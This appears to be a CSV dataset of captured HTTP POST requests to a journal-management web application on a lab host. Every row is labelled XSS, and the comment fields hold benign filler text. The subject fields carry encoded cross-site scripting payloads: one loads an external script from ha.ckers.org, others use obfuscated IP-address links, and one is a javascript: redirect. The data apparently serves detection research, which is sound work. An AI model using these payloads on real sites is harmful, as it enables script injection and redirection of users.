request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
20cbe259ef94aa58188c8b770b71f366,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%26gt%3bdocument%26%2346%3bwrite(%5c%22%26lt%3bSCRI%5c%22)%3b%26lt%3b%2fSCRIPT%26gt%3bPT%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EA%20comprehensive%20study%20on%20the%20psychological%20effects%20of%20social%20media%20usage%20among%20teenagers%20and%20its%20correlation%20with%20anxiety%20and%20depression%2e%3C%2Fp%3E&submitFormButton=,543,172.19.2.40,52138,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f7cd736be474dfd635da9b417ba77d5a,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2f66%26%2346%3b102%26%2346%3b7%26%2346%3b147%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThe%20paper%20discusses%20innovative%20approaches%20to%20plastic%20waste%20reduction%20in%20coastal%20communities%20and%20successful%20implementation%20of%20circular%20economy%20models%2e%3C%2Fp%3E&submitFormButton=,453,172.19.2.40,52148,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
fccc92c1f7e31e7d2d330a8c83d5bc49,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2f%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EAn%20analysis%20of%20remote%20work%20productivity%20metrics%20reveals%20that%20flexible%20schedules%20improve%20employee%20performance%20while%20reducing%20operational%20costs%2e%3C%2Fp%3E&submitFormButton=,441,172.19.2.40,52110,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
3070c6262b32a4b4d62a0e24af92f341,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2f0x42%26%2346%3b0x0000066%26%2346%3b0x7%26%2346%3b0x93%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThe%20article%20investigates%20the%20impact%20of%20artificial%20intelligence%20on%20job%20displacement%20across%20manufacturing%20and%20service%20industries%20in%20developing%20nations%2e%3C%2Fp%3E&submitFormButton=,464,172.19.2.40,52174,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
9a83a1e0b7cb7f080f4005e84ced9a38,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2f1113982867%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThis%20research%20explores%20how%20machine%20learning%20algorithms%20can%20predict%20disease%20outbreaks%20weeks%20before%20traditional%20surveillance%20methods%20detect%20them%2e%3C%2Fp%3E&submitFormButton=,413,172.19.2.40,52122,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
54b4da35c422b5e9558bb64eec61e7df,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2f0102%26%2346%3b0146%26%2346%3b0007%26%2346%3b00000223%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EA%20detailed%20examination%20of%20renewable%20energy%20adoption%20barriers%20in%20rural%20regions%20and%20policy%20solutions%20to%20accelerate%20solar%20and%20wind%20implementation%2e%3C%2Fp%3E&submitFormButton=,460,172.19.2.40,52186,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
692078fd4abc27262287bd4ad61005e4,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22htt%20p%26%2358%3b%2f%2f6%206%26%2346%3b000146%26%2346%3b0x7%26%2346%3b147%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThe%20study%20analyzes%20cybersecurity%20vulnerabilities%20in%20IoT%20devices%20and%20proposes%20a%20framework%20for%20securing%20smart%20home%20ecosystems%2e%3C%2Fp%3E&submitFormButton=,435,172.19.2.40,52140,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
ff6a518a5d3a486d1b56c4505bed4db9,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22%2f%2fwww%26%2346%3bgoogle%26%2346%3bcom%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThis%20paper%20reviews%20climate%20adaptation%20strategies%20for%20agriculture,%20focusing%20on%20drought-resistant%20crop%20varieties%20and%20precision%20farming%20techniques%2e%3C%2Fp%3E&submitFormButton=",421,172.19.2.40,52160,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d332f3b06c58f9065f9938ab1458d78a,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22%2f%2fgoogle%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EAn%20exploration%20of%20virtual%20reality%20applications%20in%20medical%20training%20demonstrates%20improved%20surgical%20skill%20acquisition%20compared%20to%20traditional%20education%20methods%2e%3C%2Fp%3E&submitFormButton=,408,172.19.2.40,52102,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
02fe961b53494c8bd897924ce4a8b29b,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg@google%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThe%20article%20discusses%20the%20economic%20implications%20of%20cryptocurrency%20regulation%20and%20its%20effect%20on%20fintech%20innovation%20in%20Southeast%20Asia%2e%3C%2Fp%3E&submitFormButton=,428,172.19.2.40,52130,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
6a6abe386d009e9ca59469e31d9557d6,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2fgoogle%26%2358%3bha%26%2346%3bckers%26%2346%3borg%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EA%20comprehensive%20review%20of%20mental%20health%20interventions%20in%20corporate%20environments%20shows%20that%20workplace%20wellness%20programs%20reduce%20employee%20burnout%20significantly%2e%3C%2Fp%3E&submitFormButton=,465,172.19.2.40,52138,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
bb536d2d3575a7650ae628881d4494dd,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2fgoogle%26%2346%3bcom%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThis%20research%20examines%20the%20effectiveness%20of%20AI-powered%20customer%20service%20chatbots%20and%20their%20limitations%20in%20handling%20complex%20client%20interactions%2e%3C%2Fp%3E&submitFormButton=,423,172.19.2.40,52148,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
5d41895e99082a527a835c257b67704b,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22javascript%26%23058%3bdocument%26%2346%3blocation%3d'http%26%2358%3b%2f%2fwww%26%2346%3bgoogle%26%2346%3bcom%2f'%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EAn%20analysis%20of%20urban%20green%20spaces%20reveals%20their%20significant%20impact%20on%20air%20quality,%20property%20values,%20and%20citizen%20mental%20health%2e%3C%2Fp%3E&submitFormButton=",476,172.19.2.40,52110,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
1d1d9670053e87b2c7a3fb9dee37c4cd,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2fwww%26%2346%3bgoogle%26%2346%3bcom%26%2346%3b%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThe%20paper%20investigates%20educational%20disparities%20in%20STEM%20fields%20and%20proposes%20mentorship%20programs%20to%20increase%20diversity%20among%20young%20scientists%2e%3C%2Fp%3E&submitFormButton=,445,172.19.2.40,52174,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
8279cd2625e9f2193a6374c03e888728,"Fri, 12 Jun 2026 07:51:31 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bA%20HREF%3d%5c%22http%26%2358%3b%2f%2fwww%26%2346%3bgohttp%26%2358%3b%2f%2fwww%26%2346%3bgoogle%26%2346%3bcom%2fogle%26%2346%3bcom%2f%5c%22%26gt%3bXSS%26lt%3b%2fA%26gt%3b&comment=%3Cp%3EThis%20study%20explores%20how%20autonomous%20vehicles%20will%20reshape%20urban%20infrastructure%20and%20traffic%20management%20systems%20in%20smart%20cities%2e%3C%2Fp%3E&submitFormButton=,475,172.19.2.40,52122,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
